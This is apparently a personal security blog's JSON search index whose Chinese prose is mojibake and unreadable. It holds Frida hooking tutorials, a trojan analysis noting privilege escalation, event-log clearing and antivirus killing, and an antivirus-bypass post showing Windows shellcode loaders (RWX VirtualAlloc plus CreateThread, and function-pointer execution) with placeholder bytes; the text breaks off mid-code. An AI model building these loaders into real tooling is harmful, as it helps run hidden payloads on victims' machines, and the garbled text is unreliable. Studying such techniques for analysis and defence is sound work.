{"meta":{"title":"e1ectr0nlc's Blog","subtitle":"","description":"å­¦ä¹ è®°å½•","author":"e1ectr0nlc","url":"https://e1ectr0nlc.github.io","root":"/"},"pages":[{"title":"","date":"2024-05-12T09:37:12.696Z","updated":"2024-05-12T09:37:12.696Z","comments":true,"path":"404.html","permalink":"https://e1ectr0nlc.github.io/404.html","excerpt":"","text":"404 å¾ˆæŠ±æ­‰ï¼Œæ‚¨è®¿é—®çš„é¡µé¢ä¸å­˜åœ¨ å¯èƒ½æ˜¯è¾“å…¥åœ°å€æœ‰è¯¯æˆ–è¯¥åœ°å€å·²è¢«åˆ é™¤"},{"title":"","date":"2024-05-12T09:34:36.954Z","updated":"2024-05-12T09:34:36.954Z","comments":true,"path":"mylist/index.html","permalink":"https://e1ectr0nlc.github.io/mylist/index.html","excerpt":"","text":""},{"title":"æ–‡ç« åˆ†ç±»","date":"2024-05-12T13:29:32.339Z","updated":"2024-05-12T13:29:32.339Z","comments":true,"path":"categories/index.html","permalink":"https://e1ectr0nlc.github.io/categories/index.html","excerpt":"","text":""},{"title":"","date":"2024-05-12T09:33:11.243Z","updated":"2024-05-12T09:33:11.243Z","comments":true,"path":"about/index.html","permalink":"https://e1ectr0nlc.github.io/about/index.html","excerpt":"","text":""},{"title":"æˆ‘çš„æœ‹å‹ä»¬","date":"2024-05-12T09:15:32.520Z","updated":"2024-05-12T09:15:32.520Z","comments":true,"path":"friends/index.html","permalink":"https://e1ectr0nlc.github.io/friends/index.html","excerpt":"","text":""}],"posts":[{"title":"Fridaå­¦ä¹ (äºŒ)","slug":"Fridaå­¦ä¹ (äºŒ)","date":"2024-04-14T16:00:00.000Z","updated":"2024-05-12T13:37:39.427Z","comments":true,"path":"2024/04/15/Fridaå­¦ä¹ (äºŒ)/","permalink":"https://e1ectr0nlc.github.io/2024/04/15/Frida%E5%AD%A6%E4%B9%A0(%E4%BA%8C)/","excerpt":"è¿™ç¯‡æ–‡ç« ç”¨æ¥è®°å½•Fridaåœ¨Hookå„ç§æ–¹æ³•æ—¶çš„è„šæœ¬ç¼–å†™ã€‚","text":"è¿™ç¯‡æ–‡ç« ç”¨æ¥è®°å½•Fridaåœ¨Hookå„ç§æ–¹æ³•æ—¶çš„è„šæœ¬ç¼–å†™ã€‚ æµ‹è¯•æºç  1234567891011121314151617181920212223242526272829303132package com.example.lesson4one;import androidx.appcompat.app.AppCompatActivity;import android.os.Bundle;import android.util.Log;public class MainActivity extends AppCompatActivity &#123; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); while (true)&#123; try &#123; Thread.sleep(1000); &#125; catch (InterruptedException e) &#123; throw new RuntimeException(e); &#125; int m; m = fun(50, 80); &#125; &#125; int fun(int x, int y)&#123; Log.d(&quot;e1ectr0nlc&quot;, String.valueOf(x + y)); return x + y; &#125;&#125; æ§åˆ¶å°è¿è¡Œ 1frida -U -l xxx.js com.example.lesson4one Hookè°ƒç”¨çš„æ–¹æ³• ä½¿ç”¨Fridaè·å–åˆ°è°ƒç”¨çš„funï¼ˆï¼‰å‡½æ•°ã€‚ 12345678910function main()&#123; Java.perform(function()&#123; Java.use(&quot;com.example.lesson4one.MainActivity&quot;).fun.implementation = function(arg1,arg2)&#123; var result = this.fun(arg1,arg2);//æˆ–è€…è¿™é‡Œå°†å‚æ•°æ”¹ä¸ºä¸¤ä¸ªæ•´æ•°ä¾‹å¦‚ï¼ˆ48ï¼Œ56ï¼‰ console.log(&quot;arg1, arg2, result&quot;, arg1, arg2, result); return result; &#125; &#125;)&#125;setImmediate(main) Hooké‡è½½çš„æ–¹æ³•æ›´æ”¹æºç å¦‚ä¸‹ 1234567891011121314151617181920212223242526272829303132333435363738394041package com.example.lesson4one;import androidx.appcompat.app.AppCompatActivity;import android.os.Bundle;import android.util.Log;public class MainActivity extends AppCompatActivity &#123; private static String total = &quot;@@@@####@@@@&quot;; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); while (true)&#123; try &#123; Thread.sleep(1000); &#125; catch (InterruptedException e) &#123; throw new RuntimeException(e); &#125; int m = fun(50,80); Log.d(&quot;e1ectr0nlc m = &quot;, String.valueOf(m)); Log.d(&quot;e1ectr0nlc tolowercase&quot;, fun(&quot;LOWERCASEME!&quot;)); &#125; &#125; String fun(String x )&#123; total +=x ; return x.toLowerCase();//å¤§å†™æ”¹å°å†™ &#125; int fun(int x, int y)&#123; Log.d(&quot;e1ectr0nlc&quot;, String.valueOf(x + y)); return x + y; &#125;&#125; JSè„šæœ¬å¦‚ä¸‹ 1234567891011121314151617function main()&#123; Java.perform(function()&#123; Java.use(&quot;com.example.lesson4one.MainActivity&quot;).fun.overload(&#x27;int&#x27;, &#x27;int&#x27;).implementation = function(arg1, arg2)&#123; var result = this.fun(100, 200); // æ›´æ”¹å‚æ•°console.log(Java.use(&quot;android.util.Log&quot;).getStackTraceString(Java.use(&quot;java.lang.Throwable&quot;).$new())); // æ‰“å°è°ƒç”¨æ ˆ,ä¸éœ€è¦çš„è¯å¯ä»¥æ³¨é‡Šæ‰ã€‚ console.log(&quot;arg1, arg2, result&quot;, arg1, arg2, result); return result; &#125; Java.use(&quot;com.example.lesson4one.MainActivity&quot;).fun.overload(&#x27;java.lang.String&#x27;).implementation = function (arg1 )&#123; var result = this.fun(Java.use(&#x27;java.lang.String&#x27;).$new(&quot;NIHAOJAVA&quot;)); console.log(&quot;arg1,result&quot;,arg1,result) return result; //return Java.use(&#x27;java.lang.String&#x27;).$new(&quot;NIHAOJS&quot;);ç›´æ¥æ›´æ”¹è¿”å›å€¼ &#125; &#125;)&#125;setImmediate(main) æ‰“å°ç»“æœå¦‚ä¸‹ åŒæ—¶Appå†…çš„æ—¥å¿—ä¿¡æ¯ä¹Ÿä¼šæ”¹å˜ Hookæœªè°ƒç”¨çš„æ–¹æ³•åœ¨æºç ä¸­æ·»åŠ ä¸€ä¸ªæ²¡æœ‰è°ƒç”¨è¿‡çš„å‡½æ•° 1234//æ·»åŠ å‡½æ•°ä½†ä¸è°ƒç”¨String secret()&#123; return total; &#125; è„šæœ¬ä»£ç  1234567891011function main()&#123; Java.perform(function()&#123; Java.choose(&quot;com.example.lesson4one.MainActivity&quot;,&#123; onMatch:function(instance)&#123; console.log(&quot;found instance :&quot;,instance) console.log(&quot;found instance :&quot;,instance.secret()) &#125;,onComplete:function()&#123;&#125; &#125;) &#125;)&#125;setImmediate(main) Hookæœªè°ƒç”¨çš„é™æ€æ–¹æ³•1234//æµ‹è¯•ä»£ç ä¸­æ·»åŠ æœªè°ƒç”¨çš„é™æ€æ–¹æ³•public static String secret2()&#123; return total; &#125; Hookè„šæœ¬ 1234567function main()&#123; Java.perform(function()&#123; var result = Java.use(&quot;com.example.lesson4one.MainActivity&quot;).secret2(); console.log(result); &#125;)&#125;setImmediate(main) æ€»çš„æµ‹è¯•ä»£ç  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748package com.example.lesson4one;import androidx.appcompat.app.AppCompatActivity;import android.os.Bundle;import android.util.Log;public class MainActivity extends AppCompatActivity &#123; private static String total = &quot;@@@@####@@@@&quot;; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); while(true)&#123; try &#123; Thread.sleep(1000); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; int m = fun(50,80); Log.d(&quot;e1ectr0nlc m = &quot;, String.valueOf(m)); Log.d(&quot;e1ectr0nlc tolowercase&quot;, fun(&quot;LOWERCASEME!&quot;)); &#125; &#125; String fun(String x )&#123; total +=x ; return x.toLowerCase(); &#125; int fun(int x ,int y)&#123; Log.d(&quot;e1ectr0nlc&quot;, String.valueOf((x+y))); return x+y; &#125; String secret()&#123; return total; &#125; public static String secret2()&#123; return total; &#125;&#125;","categories":[{"name":"Hookæ¡†æ¶","slug":"Hookæ¡†æ¶","permalink":"https://e1ectr0nlc.github.io/categories/Hook%E6%A1%86%E6%9E%B6/"}],"tags":[]},{"title":"Fridaå­¦ä¹ (ä¸€)","slug":"Fridaå­¦ä¹ (ä¸€)","date":"2024-04-11T16:00:00.000Z","updated":"2024-05-12T13:40:26.896Z","comments":true,"path":"2024/04/12/Fridaå­¦ä¹ (ä¸€)/","permalink":"https://e1ectr0nlc.github.io/2024/04/12/Frida%E5%AD%A6%E4%B9%A0(%E4%B8%80)/","excerpt":"å­¦ä¹ Fridaè„šæœ¬çš„ç¼–å†™","text":"å­¦ä¹ Fridaè„šæœ¬çš„ç¼–å†™ Fridaè„šæœ¬çš„æ¦‚å¿µFRIDAè„šæœ¬å°±æ˜¯åˆ©ç”¨FRIDAåŠ¨æ€æ’æ¡©æ¡†æ¶ï¼Œä½¿ç”¨FRIDAå¯¼å‡ºçš„APIå’Œæ–¹æ³•ï¼Œå¯¹å†…å­˜ç©ºé—´é‡Œçš„å¯¹è±¡æ–¹æ³•è¿›è¡Œç›‘è§†ã€ä¿®æ”¹æˆ–è€…æ›¿æ¢çš„ä¸€æ®µä»£ç ã€‚FRIDAçš„APIæ˜¯ä½¿ç”¨JavaScriptå®ç°çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å……åˆ†åˆ©ç”¨JSçš„åŒ¿åå‡½æ•°çš„ä¼˜åŠ¿ã€ä»¥åŠå¤§é‡çš„hookå’Œå›è°ƒå‡½æ•°çš„APIã€‚å¦‚æœä¸äº†è§£åŒ¿åå‡½æ•°ï¼Œå¯ä»¥å…ˆç®€å•äº†è§£ä¸€ä¸‹ï¼Œç›¸ä¿¡å¯¹ä½ ç¼–å†™Fridaè„šæœ¬ä¼šæœ‰å¸®åŠ©ã€‚ ä¸¾ä¸€ä¸ªæœ€ç®€å•çš„ä¾‹å­ 123456function main()&#123; Java.perform(function()&#123; console.log(&quot;hello world&quot;); &#125;) &#125; setImmediate(main) è¿™æ®µä»£ç çš„ä½œç”¨æ˜¯åœ¨ Android åº”ç”¨ç¨‹åºçš„ Java è™šæ‹Ÿæœºä¸­æ‰§è¡Œä¸€ä¸ªå‡½æ•°ï¼Œè¯¥å‡½æ•°å°†åœ¨ Frida æ§åˆ¶å°è¾“å‡º &quot;hello world&quot;ã€‚ æ§åˆ¶å°è¿è¡Œ 1frida -U -l hello-world.js android.process.media â€œ-Uâ€è¡¨ç¤ºä½¿ç”¨USBè¿æ¥åˆ°è®¾å¤‡ï¼Œè€Œä¸æ˜¯é€šè¿‡ç½‘ç»œè¿æ¥ï¼›â€-lâ€è¡¨ç¤ºæŒ‡å®šè¦åŠ è½½çš„JavaScriptè„šæœ¬æ–‡ä»¶ï¼›â€android.process.mediaâ€æ˜¯ç›®æ ‡è¿›ç¨‹çš„åç§° è§£é‡Šä¸€ä¸‹è¿™æ®µä»£ç ï¼Œ é¦–å…ˆæ˜¯function main() &#123; ... &#125;æ˜¯javascriptä¸­å®šä¹‰å‡½æ•°çš„è¯­æ³•ï¼Œå‡½æ•°åä¸ºmainã€‚ Java.perform(function() &#123; ... &#125;);æ˜¯Fridaä¸­çš„ä¸€ä¸ªé‡è¦å‡½æ•°ï¼Œå®ƒæ¥å—ä¸€ä¸ªå‡½æ•°ä½œä¸ºå‚æ•°ï¼Œåœ¨è¢«Frida Hookçš„Javaè™šæ‹Ÿæœºä¸­æ‰§è¡Œã€‚åœ¨è¿™ä¸ªå‡½æ•°å†…éƒ¨ï¼Œå¯ä»¥ä½¿ç”¨Fridaæä¾›çš„APIæ¥å£æ¥è¿›è¡ŒåŠ¨æ€åˆ†æã€ä¿®æ”¹ã€æ‹¦æˆªç­‰æ“ä½œã€‚ console.log(&quot;hello world&quot;);: è¿™æ˜¯ JavaScript ä¸­çš„è¾“å‡ºè¯­å¥ï¼Œç”¨äºåœ¨ Frida æ§åˆ¶å°è¾“å‡ºä¿¡æ¯ã€‚åœ¨è¿™é‡Œï¼Œå®ƒå°†è¾“å‡ºå­—ç¬¦ä¸² â€œhello world setImmediate(main): è¿™æ˜¯ JavaScript ä¸­çš„ä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºåœ¨å½“å‰ JavaScript äº‹ä»¶å¾ªç¯çš„ä¸‹ä¸€ä¸ªå¾ªç¯è¿­ä»£ä¸­æ‰§è¡ŒæŒ‡å®šçš„å‡½æ•°ã€‚åœ¨è¿™é‡Œï¼Œå®ƒç”¨äºåœ¨å½“å‰ JavaScript æ‰§è¡Œæ ˆç»“æŸåç«‹å³è°ƒç”¨ main å‡½æ•°ã€‚ è¿›é˜¶æ“ä½œäº†è§£äº†Fridaå¦‚ä½•è¿›è¡ŒåŸºæœ¬çš„ä½¿ç”¨ï¼Œæ¥ä¸‹æ¥å°±å¯ä»¥å°è¯•ä½¿ç”¨ä¸€äº›APIå‡½æ•°è¿›è¡Œæ“ä½œã€‚ FRIDAçš„APIæ‰‹å†Œ æšä¸¾æ‰€æœ‰åŠ è½½çš„ç±»123456789101112function main()&#123; Java.perform(function()&#123; console.log(&quot;\\n[*] enumerating classes...&quot;); Java.enumerateLoadedClasses(&#123; onMatch: function(_className)&#123; console.log(&quot;[*] found instance of &#x27;&quot;+_className+&quot;&#x27;&quot;); &#125;, onComplete: function()&#123; console.log(&quot;[*] class enuemration complete&quot;); &#125;) &#125; setImmediate(main) ä¿å­˜å¹¶æ‰§è¡Œ å¯ä»¥å¾—åˆ°å¦‚ä¸‹ç»“æœ å¤ªå¤šäº†åªæˆªå–äº†æœ€åä¸€æ®µ è§£é‡Šä¸€ä¸‹è¿™æ®µä»£ç ï¼š Java.enumerateLoadedClasses(&#123; ... &#125;): è¿™æ˜¯ Frida æä¾›çš„ä¸€ä¸ªæ–¹æ³•ï¼Œç”¨äºæšä¸¾å½“å‰å·²åŠ è½½çš„æ‰€æœ‰ç±»ã€‚å®ƒæ¥å—ä¸€ä¸ª JavaScript å¯¹è±¡ä½œä¸ºå‚æ•°ï¼Œè¯¥å¯¹è±¡åŒ…å«ä¸¤ä¸ªå±æ€§ï¼šonMatch å’Œ onComplete onMatch: function(_className) &#123; ... &#125;: è¿™æ˜¯ä¸€ä¸ªå›è°ƒå‡½æ•°ï¼Œç”¨äºå¤„ç†æ¯ä¸ªåŒ¹é…åˆ°çš„ç±»åã€‚åœ¨æ¯æ¬¡æ‰¾åˆ°ä¸€ä¸ªç±»åæ—¶ï¼Œè¿™ä¸ªå‡½æ•°ä¼šè¢«è°ƒç”¨ã€‚åœ¨è¿™ä¸ªå‡½æ•°ä¸­ï¼Œç±»åå­˜å‚¨åœ¨ _className å‚æ•°ä¸­ï¼Œå¹¶é€šè¿‡ console.log è¾“å‡ºåˆ° Frida æ§åˆ¶å° onComplete: function() &#123; ... &#125;: è¿™ä¹Ÿæ˜¯ä¸€ä¸ªå›è°ƒå‡½æ•°ï¼Œå½“æ‰€æœ‰ç±»éƒ½è¢«æšä¸¾å®Œæ¯•æ—¶è°ƒç”¨ã€‚åœ¨è¿™ä¸ªå‡½æ•°ä¸­ï¼Œé€šè¿‡ console.log è¾“å‡ºä¸€æ¡æ¶ˆæ¯è¡¨ç¤ºç±»æšä¸¾è¿‡ç¨‹å®Œæˆ å®šä½ç›®æ ‡ç±»æˆ‘ä»¬æ—¢ç„¶å¯ä»¥è·å–åˆ°åŠ è½½çš„æ‰€æœ‰ç±»ï¼Œä¹Ÿå¯ä»¥è·å–æŒ‡å®šç±»ã€‚å‡å¦‚æˆ‘ä»¬éœ€è¦è·å–æœ‰å…³è“ç‰™çš„æŸä¸ªç±»ï¼Œä»£ç å¦‚ä¸‹ï¼š 123456789101112131415function main()&#123; Java.perform(function()&#123; Java.enumerateLoadedClasses(&#123; onMatch: function(instance)&#123; if (instance.split(&quot;.&quot;)[1] == &quot;bluetooth&quot;)&#123; console.log(&quot;[-&gt;]\\t&quot;+instance); &#125; &#125;, onComplete: function() &#123; console.log(&quot;[*] class enuemration complete&quot;); &#125; &#125;); &#125;)&#125;setImmediate(main) è¿™é‡Œä¸å†èµ˜è¿°ä»£ç çš„å…¶ä»–éƒ¨åˆ†ï¼Œåªè¯´onMatchå‡½æ•°çš„åˆ¤æ–­ instanceæ˜¯é€šè¿‡Java.enumerateLoadedClassesè·å–åˆ°çš„ç±»ï¼Œä»£è¡¨ä¸€ä¸ªå®Œæ•´ç±»å split(&quot;.&quot;)[1]æ˜¯JavaScriptçš„å­—ç¬¦ä¸²æ–¹æ³•ï¼Œç”¨äºæŒ‰ç…§åˆ†éš”ç¬¦å°†å­—ç¬¦ä¸²è¿›è¡Œåˆ†å‰²ï¼Œå› ä¸ºç±»åå¤šæ˜¯ä»¥&quot;.&quot;è¿›è¡Œå‘½åï¼Œæ‰€ä»¥å°†&quot;.&quot;ä½œä¸ºåˆ†å‰²ç¬¦ä½¿ç”¨ï¼Œ[1]åˆ™æ˜¯JavaScript æ•°ç»„ç´¢å¼•æ“ä½œç¬¦ï¼Œç”¨äºè·å–æ•°ç»„ä¸­æŒ‡å®šç´¢å¼•ä½ç½®çš„å…ƒç´ ã€‚åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬è·å–åˆ†å‰²åçš„å­—ç¬¦ä¸²æ•°ç»„çš„ç¬¬äºŒä¸ªå…ƒç´ ï¼Œå³ç´¢å¼•ä¸º1çš„å…ƒç´ ã€‚ æ‰“å°ç±»çš„å®ä¾‹åœ¨æˆ‘ä»¬å®šä½åˆ°ç›®æ ‡ç±»åï¼Œå°±å¯ä»¥æ‰“å°æƒ³è¦ç ”ç©¶çš„ç±»çš„å®ä¾‹äº† ä»£ç ï¼š 1234567891011function main()&#123; Java.perform(function()&#123; Java.choose(&quot;android.bluetooth.BluetoothDevice&quot;,&#123; onMatch: function (instance)&#123; console.log(&quot;[*] &quot;+&quot; android.bluetooth.BluetoothDevice instance found&quot;+&quot; :=&gt; &#x27;&quot;+instance+&quot;&#x27;&quot;); bluetoothDeviceInfo(instance); &#125;, onComplete: function() &#123; console.log(&quot;[*] -----&quot;);&#125; &#125;)&#125;setImmediate(main) è¿è¡Œ 1frida -U -l hello.js com.android.bluetooth æšä¸¾æ‰€æœ‰æ–¹æ³•ä½¿ç”¨java.use()è·å–æ‰€æœ‰æ–¹æ³• 12345678910111213141516171819function main() &#123; Java.perform(function () &#123; // è·å– android.bluetooth.IBluetoothHeadset æ¥å£çš„ç±»å¯¹è±¡ var BluetoothHeadset = Java.use(&#x27;android.bluetooth.IBluetoothHeadset&#x27;); // è·å–è¯¥æ¥å£çš„æ‰€æœ‰æ–¹æ³• var methods = BluetoothHeadset.class.getDeclaredMethods(); // éå†æ‰€æœ‰æ–¹æ³• for (var i = 0; i &lt; methods.length; i++) &#123; var method = methods[i]; // è¾“å‡ºæ–¹æ³•å console.log(method.toString()); &#125; &#125;);&#125;// ç«‹å³æ‰§è¡Œæšä¸¾æ–¹æ³•setImmediate(main) æ§åˆ¶å°å‘½ä»¤ 1frida -U -l hello.js com.android.bluetooth è·å–äº†æ–¹æ³•ï¼Œæ¥ä¸‹æ¥å°±æ˜¯å¯¹æ–¹æ³•çš„å„ç§ä¿®æ”¹æ‹¦æˆªäº†ã€‚","categories":[{"name":"Hookæ¡†æ¶","slug":"Hookæ¡†æ¶","permalink":"https://e1ectr0nlc.github.io/categories/Hook%E6%A1%86%E6%9E%B6/"}],"tags":[]},{"title":"æ¶æ„ç¨‹åºåˆ†ææµç¨‹","slug":"æ¶æ„ç¨‹åºåˆ†ææµç¨‹","date":"2024-04-09T16:00:00.000Z","updated":"2024-05-13T03:28:57.513Z","comments":true,"path":"2024/04/10/æ¶æ„ç¨‹åºåˆ†ææµç¨‹/","permalink":"https://e1ectr0nlc.github.io/2024/04/10/%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E6%B5%81%E7%A8%8B/","excerpt":"è¿™æ®µæ—¶é—´æƒ³ç€æ¥åˆ†æå‡ ä¸ªæœ¨é©¬ç¨‹åºç»ƒç»ƒæ‰‹ï¼Œè¿™ç¯‡åšå®¢å°±æ¥è®°å½•ä¸€ä¸‹æ•´ä¸ªæ¶æ„ä»£ç çš„åˆ†æè¿‡ç¨‹ï¼Œæœ‰ä¸ªå¤§è‡´äº†è§£ï¼ŒåŒæ—¶ä¹Ÿæƒ³çœ‹çœ‹æœ¨é©¬å¦‚ä½•è·å–åˆ°ç›®æ ‡ä¸»æœºçš„æƒé™ï¼Œå¯¹æ”»å‡»æ‰‹æ³•æœ‰ä¸€ä¸ªå¤§è‡´çš„äº†è§£ã€‚","text":"è¿™æ®µæ—¶é—´æƒ³ç€æ¥åˆ†æå‡ ä¸ªæœ¨é©¬ç¨‹åºç»ƒç»ƒæ‰‹ï¼Œè¿™ç¯‡åšå®¢å°±æ¥è®°å½•ä¸€ä¸‹æ•´ä¸ªæ¶æ„ä»£ç çš„åˆ†æè¿‡ç¨‹ï¼Œæœ‰ä¸ªå¤§è‡´äº†è§£ï¼ŒåŒæ—¶ä¹Ÿæƒ³çœ‹çœ‹æœ¨é©¬å¦‚ä½•è·å–åˆ°ç›®æ ‡ä¸»æœºçš„æƒé™ï¼Œå¯¹æ”»å‡»æ‰‹æ³•æœ‰ä¸€ä¸ªå¤§è‡´çš„äº†è§£ã€‚ å¯¹ç¨‹åºæœ¬èº«ç‰¹å¾è¿›è¡Œæ£€æŸ¥æŸ¥å£³ ç¨‹åºä¸º32ä½ç¨‹åºï¼Œæ²¡æœ‰åŠ å£³ æŸ¥çœ‹PEæ–‡ä»¶èŠ‚è¡¨ä¿¡æ¯ å¯ä»¥çœ‹åˆ°èŠ‚è¡¨ä¸­æœ‰ä¸€ä¸ªå«â€baiduâ€çš„æ®µï¼Œæ­£å¸¸ç¨‹åºä¸­ä¸ä¼šæœ‰è¿™ä¸ªæ®µ æŸ¥çœ‹æ–‡ä»¶å­˜åœ¨çš„å­—ç¬¦ä¸² å­˜åœ¨ä¸€ä¸ªç½‘å€ï¼ŒçŒœæµ‹å¯èƒ½æœ‰ç½‘ç»œæ“ä½œ æŸ¥çœ‹æ¶æ„ç¨‹åºè¿›è¡Œåˆ†ææºç¨‹åºshoves.exeçš„å‡½æ•° é™æ€åˆ†ææ²¡æœ‰å¾—åˆ°ç»“æœï¼Œå°è¯•åœ¨ODä¸­åŠ¨æ€åˆ†æ åœ¨0x41021Aåœ°å€å¤„å­˜åœ¨ä¸€ä¸ªè§£å¯†å‡½æ•°ï¼Œå°†0x4106bcå¤„çš„å†…å®¹åŠ¨æ€è§£å¯† è§£å¯†å‰ï¼š è§£å¯†åï¼š å¯ä»¥çœ‹åˆ°Doså¤´å·²ç»å‡ºç°äº†ï¼Œè¯´æ˜è¿™æ˜¯å¦å¤–çš„ä¸€ä¸ªPEæ–‡ä»¶ï¼Œdumpå‡ºæ¥åå‘ç°æ˜¯ä¸€ä¸ªdllæ–‡ä»¶ æ¥ç€åˆ†æDllæ–‡ä»¶ ä¸ºè¿›ç¨‹ææƒé€šè¿‡OpenProcessTokenå¾—åˆ°è¿›ç¨‹çš„ä»¤ç‰Œå¥æŸ„ï¼Œä½¿ç”¨LookupPrivilegeValueæŸ¥è¯¢è¿›ç¨‹æƒé™ï¼Œæœ€åç”¨AdjustTokenPrivilegeså‡½æ•°æå‡æƒé™ åˆ é™¤æ—¥å¿—é€šè¿‡OpenEventLogå‡½æ•°æ‰“å¼€æ—¥å¿—æ–‡ä»¶ï¼Œå¦‚æœæˆåŠŸæ‰“å¼€ï¼Œè°ƒç”¨ClearEventLogå‡½æ•°æ¸…é™¤æ—¥å¿—æ–‡ä»¶ï¼Œæœ€åè°ƒç”¨CloseEventLogå‡½æ•°å…³é—­æ—¥å¿—æ–‡ä»¶ å…³é—­æ€è½¯æŸ¥è¯¢ç³»ç»Ÿé•œåƒï¼Œè·å¾—æ‰€æœ‰è¿›ç¨‹ä¿¡æ¯ï¼Œå¹¶æŸ¥æ‰¾æ€è½¯ æ€è½¯å­—å…¸","categories":[{"name":"bypass","slug":"bypass","permalink":"https://e1ectr0nlc.github.io/categories/bypass/"}],"tags":[]},{"title":"shellcodeçš„åŠ è½½","slug":"shellcodeçš„åŠ è½½æ–¹å¼","date":"2023-11-11T16:00:00.000Z","updated":"2024-05-12T12:50:06.461Z","comments":true,"path":"2023/11/12/shellcodeçš„åŠ è½½æ–¹å¼/","permalink":"https://e1ectr0nlc.github.io/2023/11/12/shellcode%E7%9A%84%E5%8A%A0%E8%BD%BD%E6%96%B9%E5%BC%8F/","excerpt":"ä»Šå¤©æ¥å­¦ä¹ ä¸€ä¸‹shellcodeçš„å„ç§åŠ è½½æ–¹å¼ã€","text":"ä»Šå¤©æ¥å­¦ä¹ ä¸€ä¸‹shellcodeçš„å„ç§åŠ è½½æ–¹å¼ã€ åŠ¨æ€å†…å­˜åˆ†é…æ¦‚å¿µåœ¨è¿›ç¨‹çš„å†…å­˜ç©ºé—´ä¸­ï¼Œä½ æœ‰æ²¡æœ‰æƒ³è¿‡æ‰§è¡Œä¸€æ®µshellcodeéœ€è¦ä»€ä¹ˆï¼Ÿä¸ºäº†æ‰§è¡Œä½ çš„shellcodeï¼Œéœ€è¦å®Œæˆä¸‰ä¸ªæ£€æŸ¥ï¼š 1.å†…å­˜æ˜¯å¦è¢«æ ‡è®°ä¸ºå¯æ‰§è¡Œçš„è™šæ‹Ÿåœ°å€ç©ºé—´ï¼Œå¦åˆ™DEPå°†æŠ›å‡ºå†…å­˜è®¿é—®å†²çªå¼‚å¸¸ï¼› 2.æ˜¯å¦å°†shellcodeæ”¾å…¥äº†è¯¥å†…å­˜ç©ºé—´ï¼› 3.æ˜¯å¦å°†ä»£ç çš„æ‰§è¡Œæµå®šä½åˆ°è¯¥å†…å­˜ç©ºé—´ã€‚ å®Œæˆè¿™ä¸‰æ­¥å¯ä»¥ä½¿ç”¨APIæ¥ç†è§£ï¼Œé¦–å…ˆVirtualAllocåˆ†é…å‡ºä¸€ç‰‡å¯è¯»ã€å¯å†™å¯æ‰§è¡Œçš„å†…å­˜ï¼Œå°†shellcodeä½¿ç”¨RtlMoveMemoryä¹‹ç±»çš„å‡½æ•°å¤åˆ¶åˆ°è¯¥å†…å­˜ç©ºé—´ï¼Œæœ€ååˆ›å»ºä¸€ä¸ªæŒ‡å‘æ–°åˆ†é…å†…å­˜åŒºåŸŸçš„çº¿ç¨‹æ¥æ‰§è¡Œshellcodeã€‚ ä»£ç å¦‚ä¸‹ï¼š 1234567891011121314#include &lt;windows.h&gt;int main()&#123;char shellcode[] = &quot;\\xcc\\xcc\\xcc\\xcc\\x41\\x41\\x41\\x41&quot;;// åˆ†é…å†…å­˜LPVOID addressPointer = VirtualAlloc(NULL, sizeof(shellcode), 0x3000, 0x40);// å¤åˆ¶shellcodeRtlMoveMemory(addressPointer, shellcode, sizeof(shellcode));// æ–°å»ºçº¿ç¨‹æŒ‡å‘æ–°åˆ†é…çš„å†…å­˜ç©ºé—´CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)addressPointer, NULL, 0, 0);// ä¼‘çœ ä¸€ç§’é’Ÿç­‰å¾…çº¿ç¨‹Sleep(1000);return 0;&#125; å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè™½ç„¶è¿™æ®µä»£ç å°† shellcode æ‹·è´åˆ°äº†å †å†…å­˜ä¸­ï¼Œä½†è¿™åªæ˜¯ä¸ºäº†å°†å…¶æ‰§è¡Œï¼ˆå› ä¸ºå·²ç»èµ‹äºˆè¿™ç‰‡å†…å­˜ç©ºé—´RWXæƒé™äº†ï¼‰ã€‚é»˜è®¤æƒ…å†µä¸‹å—åˆ°Windows XPä¸­å¼•å…¥çš„ç³»ç»ŸèŒƒå›´æ•°æ®æ‰§è¡Œä¿æŠ¤ï¼ˆDEPï¼‰ç­–ç•¥çš„ä¿æŠ¤ã€‚å¯¹äºå¯ç”¨DEPçš„è¿›ç¨‹ï¼Œè¿™å°†é˜²æ­¢åœ¨æ­¤å†…å­˜åŒºåŸŸæ‰§è¡Œä»£ç ã€‚ä¸ºäº†å…‹æœè¿™ä¸ªéšœç¢ï¼Œæˆ‘ä»¬è¦æ±‚ç³»ç»Ÿå°†æ‰€éœ€çš„å†…å­˜åŒºåŸŸæ ‡è®°ä¸ºRWXã€‚è¿™æ˜¯é€šè¿‡å°†VirtualAllocçš„æœ€åä¸€ä¸ªå‚æ•°æŒ‡å®šä¸º0x40æ¥å®ç°çš„ï¼Œå°±ç›¸å½“PAGE_EXECUTE_READWRITEã€‚ ç¼ºç‚¹WinAPIè°ƒç”¨çš„ä½¿ç”¨å¾ˆå®¹æ˜“è¢«æˆç†Ÿçš„AV&#x2F;EDRç³»ç»Ÿæ£€æµ‹åˆ°ã€‚ é€šè¿‡å‡½æ•°æŒ‡é’ˆåˆ†é…æ¦‚å¿µå‡½æ•°æŒ‡é’ˆæ˜¯æŒ‡å‘å‡½æ•°çš„æŒ‡é’ˆå˜é‡ã€‚åœ¨Cè¯­è¨€ä¸­ï¼Œå‡½æ•°åå®é™…ä¸Šå°±æ˜¯è¯¥å‡½æ•°åœ¨å†…å­˜ä¸­çš„åœ°å€ï¼Œå› æ­¤å¯ä»¥å°†å‡½æ•°åèµ‹å€¼ç»™æŒ‡é’ˆå˜é‡ï¼Œä»è€Œä½¿å¾—è¯¥æŒ‡é’ˆå˜é‡æŒ‡å‘è¯¥å‡½æ•°ã€‚ ä»£ç ï¼š 1234567891011121314151617#include &lt;windows.h&gt;int main()&#123;char buf[] = &quot;\\xcc\\xcc\\xcc\\xcc&quot;;//å®šä¹‰å‡½æ•°æŒ‡é’ˆfuncint (*func)();//å°†bufçš„åœ°å€ç±»å‹å¼ºè½¬ä¸ºå‡½æ•°æŒ‡é’ˆï¼Œèµ‹å€¼ç»™funcfunc = (int 